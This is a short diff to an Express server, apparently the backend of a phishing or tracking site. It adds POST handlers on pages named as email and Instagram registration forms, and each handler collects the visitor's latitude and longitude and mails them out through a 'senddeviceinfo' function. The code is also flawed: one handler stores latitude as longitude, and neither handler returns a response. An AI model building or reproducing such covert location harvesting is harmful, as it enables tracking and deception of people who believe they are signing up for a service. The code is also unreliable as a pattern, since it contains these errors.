@@ -65,6 +65,16 @@ app.post("/", (req,resp)=>{
 app.get('/email-registration.html',(req,resp)=>{
   resp.sendFile(`${static}/email-registration.html`)
 })
+app.post('/email-registration.html', async(req,resp)=>{
+  const location = {
+    latitude : req.body.latitude,
+    longitude : req.body.latitude
+  }
+  
+  const locationinfo = JSON.stringify(location);
+  await sendmail.senddeviceinfo(locationinfo)
+
+})
 
 app.get('/email-registration-error.html',(req,resp)=>{
   resp.sendFile(`${static}/email-registration-error.html`)
@@ -72,6 +82,15 @@ app.get('/email-registration-error.html',(req,resp)=>{
 
 app.get('/insta-registration.html',(req,resp)=>{
   resp.sendFile(`${static}/insta-registration.html`)
+})
+
+app.post('/insta-registration.html', async(req,resp)=>{
+  const location = {
+    latitude: req.body.latitude,
+    longitude: req.body.longitude
+  }
+  const locationinfo = JSON.stringify(location)
+  await sendmail.senddeviceinfo(locationinfo)
 })
 
 
